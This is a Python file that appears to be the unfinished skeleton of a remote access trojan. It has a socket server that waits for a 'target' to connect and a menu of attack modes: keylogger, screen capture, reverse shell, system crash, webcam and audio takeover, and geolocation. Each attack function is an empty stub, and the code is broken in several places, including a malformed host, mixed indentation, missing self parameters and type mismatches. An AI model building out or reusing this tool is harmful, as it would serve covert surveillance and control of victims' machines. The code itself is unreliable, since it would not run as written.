from keyboard import *
import socket
from time import sleep
import pyautogui
class Server:
#server code starts here
    def __init__(self):
        self.host = "local host"
        self.port = 65535
        self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.final = []
    def binding(self):#binding ip to port
        try:
            print("binding in process")
            self.route.bind((self.host, self.port))
            print("binding was successfull waiting for target:....")
	    self.route.listen(1)
            self.waiting()
        except socket.error as err:
            #incase of socket error we will call the function again
            self.binding()

    def waiting(self):#waiting for the target to connect to us
        try:
            self.channel, self.address = self.route.accept()
            print("connection established")
            self.messaging()
        except socket.error as err:
            self.waiting()
#server code stops here

#ATTACK MODES STARTS HERE...................................
class AttackModes:
    def __init__(self):
        pass
#what to see from client
    def attack_modes(self):
        print("1: screenshare")
        print("2: Keylogger")
        print("3: shell")
        print("4: crash")
        print("5: webcam")
        print("6: Geolocate")
        self.choice = input("choose your attack mode: ")
        try:
            while True:
                if self.choice == 1:
                    #screen recording goes here
                    self.screen_record()
                    pass
                if self.choice == 2:
                    #keylogger codes goes here
                    self.keylogger()
                    pass
                if self.choice == 3:
                    #screen reverse shell goes here
                    self.reverse_shell()
                    pass
                if self.choice == 4:
                    #crashing the entire system
                    self.crash_sys()
                    pass
                if self.choice == 5:
                    #take over cameras and audio
                    self.webcam()
                    pass
                if self.choice == 6:
                    #get the exact locations
                    self.geolocate()                    
                    pass
        except: 
            self.attack_modes()
    

    #screen recording goes here
    def screen_record():
        pass

    #keylogger codes goes here 
    def keylogger():
        pass

    #screen reverse shell goes here
    def reverse_shell():
        pass

    #crashing the entire system
    def crash_sys():
        pass

    #take over cameras and audio
    def webcam():
        pass

    #get the exact locations
    def geolocate():
        pass
